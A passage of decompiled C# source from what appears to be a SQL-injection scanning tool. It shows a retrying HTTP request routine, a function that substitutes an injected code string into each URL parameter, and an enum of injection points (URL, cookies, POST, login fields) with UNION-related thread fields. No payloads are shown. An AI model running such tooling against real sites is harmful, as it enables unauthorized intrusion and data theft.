      if (!string.IsNullOrEmpty(p.LoginUser))
        networkCredential = new NetworkCredential(p.LoginUser, p.LoginPassword);
      int retry = this.__Retry;
      int num = 0;
      while (num <= retry)
      {
        if (!this.PausedOrCanceled())
        {
          this.CheckRequestDelay();
          HTTP http2 = http1;
          string url = p.URL;
          int httpMethod = (int) this.__HTTPMethod;
          ref string local1 = ref p.POST;
          string cookies = p.Cookies;
          NetworkCredential oCredentials = networkCredential;
          string str2 = "";
          ref string local2 = ref str2;
          str1 = http2.GetHTML(url, (enHTTPMethod) httpMethod, ref local1, (object) cookies, oCredentials, false, ref local2);
          if (!string.IsNullOrEmpty(str1))
          {
            if (http1.WebResponse != null)
            {
              if (string.IsNullOrEmpty(this.WebServer))
                this.WebServer = http1.WebResponse.HTTPResponse.Server;
              switch (http1.WebResponse.StatusCode)
              {
                case HttpStatusCode.UseProxy:
                case HttpStatusCode.PaymentRequired:
                case HttpStatusCode.ProxyAuthenticationRequired:
                  break;
                default:
                  goto label_21;
              }
            }
            else
              break;
          }
          checked { ++num; }
        }
        else
          break;
      }
    }
label_21:
    lock (this)
      this.__RetryExceded = string.IsNullOrEmpty(str1);
    return str1;
  }

  public static List<string> BuildTraject(string sInputUrl, string sCode, bool bPreverserValue = false)
  {
    List<string> stringList1 = new List<string>();
    List<string> stringList2 = new List<string>();
    if (sInputUrl.Contains("=") | sInputUrl.Contains("&"))
    {
      int num1 = checked (sInputUrl.Length - 1);
      int startIndex1 = 0;
      while (startIndex1 <= num1)
      {
        string Left = sInputUrl.Substring(startIndex1, 1);
        int num2;
        int startIndex2;
        if (Operators.CompareString(Left, "=", false) == 0)
          num2 = startIndex1;
        else if (Operators.CompareString(Left, "&", false) == 0)
          startIndex2 = startIndex1;
        if (startIndex1 == checked (sInputUrl.Length - 1))
          startIndex2 = checked (startIndex1 + 1);
        if (num2 > 0 & startIndex2 > 0)
        {
          string str = !bPreverserValue ? sInputUrl.Remove(checked (num2 + 1), checked (startIndex2 - num2 - 1)).Insert(checked (num2 + 1), sCode) : sInputUrl.Insert(startIndex2, sCode);
          num2 = 0;
          startIndex2 = 0;
          stringList2.Add(str);
        }
        checked { ++startIndex1; }
      }
    }
    else
    {
      int num = sInputUrl.LastIndexOf("/");
      string str = num <= 0 ? sInputUrl + sCode : (!bPreverserValue ? sInputUrl.Substring(0, checked (num + 1)) + sCode : sInputUrl + sCode);
      stringList2.Add(str);
    }
    return stringList2;
  }

  public enum InjectionPoint : byte
  {
    URL,
    Cookies,
    POST,
    LoginUser,
    LoginPassword,
  }

  private struct HTMLParams
  {
    public string URL;
    public string Cookies;
    public string POST;
    public string LoginUser;
    public string LoginPassword;
  }

  public delegate void OnProgressEventHandler(string sDesc, int iPerc, Analizer sender);

  public delegate void OnStartEventHandler(Analizer sender);

  public delegate void OnCompleteEventHandler(Analizer sender);

  private class ThreadControl
  {
    public Thread Thread { get; set; }

    public int UnionPostion { get; set; }

    public string UnionString { get; set; }

    public string Traject { get; set; }

    public string Keyword { get; set; }
  }
}
